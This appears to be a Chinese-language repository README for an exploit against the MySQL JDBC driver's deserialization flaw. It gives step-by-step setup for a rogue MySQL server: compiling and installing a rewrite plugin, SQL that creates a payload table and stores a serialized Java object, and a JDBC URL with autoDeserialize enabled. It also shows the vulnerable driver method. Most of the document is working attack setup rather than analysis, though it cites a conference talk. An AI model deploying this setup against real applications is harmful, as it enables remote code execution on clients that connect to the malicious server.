# MySQL JDBC Deserialization Payload / MySQL客户端jdbc反序列化漏洞

# 描述
当MySQL JDBC url可控时，除了能利用MySQL协议读取MySQL Client的本地文件之外，还可以利用客户端在连接服务器时会反序列化服务器返回的二进制数据，从而触发反序列化漏洞。

# 详情

## 1. 安装rewrite插件
以下安装方式任选其一
### 【任选】编译插件
下载mysql-5.7.28源码到/root/mysql-5.7.28，https://launchpadlibrarian.net/451650638/mysql-5.7_5.7.28.orig.tar.gz
rewrite_example.cc见仓库
```shell
   gcc -shared -Wall -fPIC -o /usr/lib/mysql/plugin/rewrite_example.so rewrite_example.cc  -I/root/mysql-5.7.28/include $(mysql_config --cflags) $(mysql_config --libmysqld-libs) -DMYSQL_DYNAMIC_PLUGIN -lmysqlservices
```
### 【任选】直接使用本git仓库中的rewrite_example.so

复制rewrite_example.so到/usr/lib/mysql/plugin/rewrite_example.so即可。

> rewrite_example.so在Ubuntu16.04编译，如安装时出现问题请自行编译。

## 2. 安装插件，建表，插入二进制数据
安装插件
```sql
INSTALL PLUGIN rewrite_example SONAME 'rewrite_example.so';
```
建表
1. 创建数据库：codeplutos，请自行创建
2. 建表sql如下
```sql
SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for payload
-- ----------------------------
DROP TABLE IF EXISTS `payload`;
CREATE TABLE `payload` (
  `COLLATION_NAME` varchar(255) DEFAULT NULL,
  `CHARACTER_SET_NAME` blob,
  `ID` int(5) DEFAULT NULL,
  `IS_DEFAULT` varchar(255) DEFAULT NULL,
  `IS_COMPILED` varchar(255) DEFAULT NULL,
  `SORTLEN` int(5) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of payload
-- ----------------------------
BEGIN;
INSERT INTO `payload` VALUES ('1big5_chinese_ci', 0x01, 1, 'Yes', 'Yes', 1);
COMMIT;

SET FOREIGN_KEY_CHECKS = 1;

```
插入payload
```sql
set @a=0xaced00057372002;
update codeplutos.payload set character_set_name = @a;
```

## 3. 指定jdbc url，连接
```
jdbc:mysql://server:port/codeplutos?detectCustomCollations=true&autoDeserialize=true
```

# 漏洞触发点：
com.mysql.jdbc.ConnectionImpl#buildCollationMapping
```java
private void buildCollationMapping() throws SQLException {
    //......省略
    try {
        results = stmt.executeQuery("SHOW COLLATION");
        if (versionMeetsMinimum(5, 0, 0)) {
            Util.resultSetToMap(sortedCollationMap, results, 3, 2);
        } else {
            while (results.next()) {
                sortedCollationMap.put(results.getLong(3), results.getString(2));
            }
        }
    } catch (SQLException ex) {
        if (ex.getErrorCode() != MysqlErrorNumbers.ER_MUST_CHANGE_PASSWORD || getDisconnectOnExpiredPasswords()) {
            throw ex;
        }
    }
    //......省略
}
```
# Reference
https://i.blackhat.com/eu-19/Thursday/eu-19-Zhang-New-Exploit-Technique-In-Java-Deserialization-Attack.pdf

